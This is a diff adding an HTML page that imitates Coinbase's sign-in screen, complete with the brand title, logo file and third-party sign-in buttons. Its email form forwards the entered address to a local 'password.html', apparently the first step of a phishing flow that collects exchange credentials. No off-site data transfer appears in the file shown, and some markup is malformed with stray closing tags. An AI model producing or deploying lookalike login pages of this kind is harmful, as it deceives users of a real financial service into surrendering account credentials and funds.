@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Coinbase - Sign In  </title>
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body class="bg-white text-black min-h-screen flex items-center justify-center relative font-sans">
+
+    <!-- Logo Top Left -->
+    <a href="#" class="absolute top-3 left-5">
+  <img src="Coinbase_Pro_2021_App-removebg-preview.png" alt="Logo" class="h-10 w-10">
+</a>
+
+    <!-- Sign Up Top Right -->
+    <a href="#" class="absolute top-6 right-6 text-sm font-semibold hover:underline">Sign up</a>
+
+    <!-- Sign In Card -->
+    <div class="w-full max-w-md bg-white border border-gray-200 p-8 rounded-xl shadow-sm">
+      <h2 class="text-2xl font-bold mb-6">Sign in to Coinbase</h2>
+
+      <form onsubmit="event.preventDefault(); redirectToPassword();">
+  <label class="text-sm font-semibold block mb-1">Email</label>
+  <input
+    type="email"
+    id="email"
+    placeholder="Your email address"
+    class="w-full p-3 mb-4 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-400"
+    required
+  />
+
+  <button type="submit" class="w-full bg-blue-400 hover:bg-blue-500 text-white font-semibold py-3 rounded-full transition mb-6">
+    Continue
+  </button>
+  
+</form>
+<script>
+  function redirectToPassword() {
+    const email = document.getElementById("email").value;
+    window.location.href = `password.html?email=${encodeURIComponent(email)}`;
+
+  }
+</script>
+
+
+      <div class="flex items-center mb-6">
+        <hr class="flex-grow border-gray-300" />
+        <span class="mx-2 text-sm text-gray-500">OR</span>
+        <hr class="flex-grow border-gray-300" />
+      </div>
+
+      <!-- Sign-in Options -->
+      <div class="space-y-3">
+        <button class="w-full flex items-center justify-between px-5 py-2.5 bg-gray-100 hover:bg-gray-200 rounded-full transition">
+          <span>Sign in with Passkey</span>
+          <span class="text-lg"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 75 71" version="1.1"><path d="M 23.450 2.351 C 19.618 4.090, 15.517 8.905, 14.030 13.410 C 11.865 19.970, 16.081 29.387, 22.561 32.462 C 30.177 36.076, 38.724 33.467, 43.815 25.976 C 45.790 23.069, 46.111 21.556, 45.774 16.737 C 45.348 10.657, 43.497 7.207, 38.763 3.672 C 35.453 1.201, 27.498 0.515, 23.450 2.351 M 53.898 23.285 C 52.029 24.542, 49.668 27.330, 48.650 29.480 C 47.061 32.839, 46.968 33.951, 47.991 37.365 C 48.646 39.552, 50.491 42.489, 52.091 43.893 C 54.943 46.395, 55 46.645, 55 56.548 C 55 66.066, 55.147 66.789, 57.532 69.030 L 60.064 71.409 64.744 66.730 L 69.423 62.051 66.727 59.237 L 64.031 56.423 66.740 53.714 L 69.449 51.005 67.348 48.903 L 65.246 46.802 68.873 43.478 C 72.250 40.382, 72.500 39.751, 72.500 34.303 C 72.500 29.440, 72.078 28.001, 70 25.782 C 65.190 20.646, 59.203 19.717, 53.898 23.285 M 58.541 28.346 C 57.039 29.445, 56.941 30.021, 57.941 31.889 C 59.388 34.593, 62.383 34.293, 62.798 31.402 C 63.230 28.397, 60.829 26.673, 58.541 28.346 M 22.848 39.963 C 10.245 41.641, 3.001 50.128, 2.999 63.218 L 2.999 69.500 26.249 69.237 L 49.500 68.974 49.786 58.910 C 50.071 48.859, 50.068 48.841, 46.882 45.173 C 45.128 43.153, 43.184 41.195, 42.563 40.822 C 40.665 39.682, 28.832 39.166, 22.848 39.963" stroke="none" fill="#040405" fill-rule="evenodd"/></svg>
+</svg></span>
+        <button onclick="window.location.href='https://accounts.google.com'" class="w-full flex items-center justify-between px-5 py-2.5 bg-gray-100 hover:bg-gray-200 rounded-full transition">
+  <span>Sign in with Google</span>
+  <span class="text-lg"><svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="20" height="20" viewBox="0 0 50 50">
+    <path d="M 25.996094 48 C 13.3125 48 2.992188 37.683594 2.992188 25 C 2.992188 12.316406 13.3125 2 25.996094 2 C 31.742188 2 37.242188 4.128906 41.488281 7.996094 L 42.261719 8.703125 L 34.675781 16.289063 L 33.972656 15.6875 C 31.746094 13.78125 28.914063 12.730469 25.996094 12.730469 C 19.230469 12.730469 13.722656 18.234375 13.722656 25 C 13.722656 31.765625 19.230469 37.269531 25.996094 37.269531 C 30.875 37.269531 34.730469 34.777344 36.546875 30.53125 L 24.996094 30.53125 L 24.996094 20.175781 L 47.546875 20.207031 L 47.714844 21 C 48.890625 26.582031 47.949219 34.792969 43.183594 40.667969 C 39.238281 45.53125 33.457031 48 25.996094 48 Z"></path>
+  </svg></span>
+</button>
+
+        <button onclick="openPopup('https://account.apple.com/sign-in')" class="w-full flex items-center justify-between px-5 py-2.5 bg-gray-100 hover:bg-gray-200 rounded-full transition">
+  <span>Sign in with Apple</span>
+  <span class="text-lg">
+    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 30 30">
+      <path d="M25.565,9.785c-0.123,0.077-3.051,1.702-3.051,5.305c0.138,4.109,3.695,5.55,3.756,5.55 c-0.061,0.077-0.537,1.963-1.947,3.94C23.204,26.283,21.962,28,20.076,28c-1.794,0-2.438-1.135-4.508-1.135 c-2.223,0-2.852,1.135-4.554,1.135c-1.886,0-3.22-1.809-4.4-3.496c-1.533-2.208-2.836-5.673-2.882-9 c-0.031-1.763,0.307-3.496,1.165-4.968c1.211-2.055,3.373-3.45,5.734-3.496c1.809-0.061,3.419,1.242,4.523,1.242 c1.058,0,3.036-1.242,5.274-1.242C21.394,7.041,23.97,7.332,25.565,9.785z M15.001,6.688c-0.322-1.61,0.567-3.22,1.395-4.247 c1.058-1.242,2.729-2.085,4.17-2.085c0.092,1.61-0.491,3.189-1.533,4.339C18.098,5.937,16.488,6.872,15.001,6.688z"></path>
+    </svg>
+  </span>
+</button>
+
+</svg></span>
+        </button>
+        <button onclick="window.location.href='https://keys.coinbase.com/onboarding?sdkName=%40coinbase%2Fwallet-sdk&sdkVersion=4.2.1&origin=https%3A%2F%2Flogin.coinbase.com&coop=null'" class="w-full flex items-center justify-between px-5 py-2.5 bg-gray-100 hover:bg-gray-200 rounded-full transition">
+          <span>Sign in with Wallet</span>
+          <span class="text-lg"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 70 70" version="1.1"><path d="M 31.500 11.572 C 16.100 16.743, 3.388 20.980, 3.250 20.987 C 3.112 20.994, 3 32.250, 3 46 L 3 71 37 71 L 71 71 71 46 L 71 21 66 21 L 61 21 61 11.500 C 61 6.275, 60.663 2.038, 60.250 2.084 C 59.837 2.131, 46.900 6.400, 31.500 11.572 M 40 16.283 L 27.500 20.500 39.945 20.782 C 46.789 20.938, 52.977 20.839, 53.695 20.564 C 55.423 19.901, 55.474 11.987, 53.750 12.033 C 53.063 12.052, 46.875 13.964, 40 16.283 M 47.408 43.500 C 45.891 45.816, 45.891 46.184, 47.408 48.500 C 48.543 50.233, 49.953 51, 52 51 C 54.047 51, 55.457 50.233, 56.592 48.500 C 58.109 46.184, 58.109 45.816, 56.592 43.500 C 55.457 41.767, 54.047 41, 52 41 C 49.953 41, 48.543 41.767, 47.408 43.500" stroke="none" fill="#0d1313" fill-rule="evenodd"/></svg>
+</svg></span>
+        </button>
+      </div>
+      
+
+      <p class="text-xs text-center text-gray-500 mt-6">
+        Not your device? Use a private window.<br />
+        See our <a href="#" class="underline">Privacy Policy</a> for more info.
+      </p>
+    </div>
+  </body>
+</html>
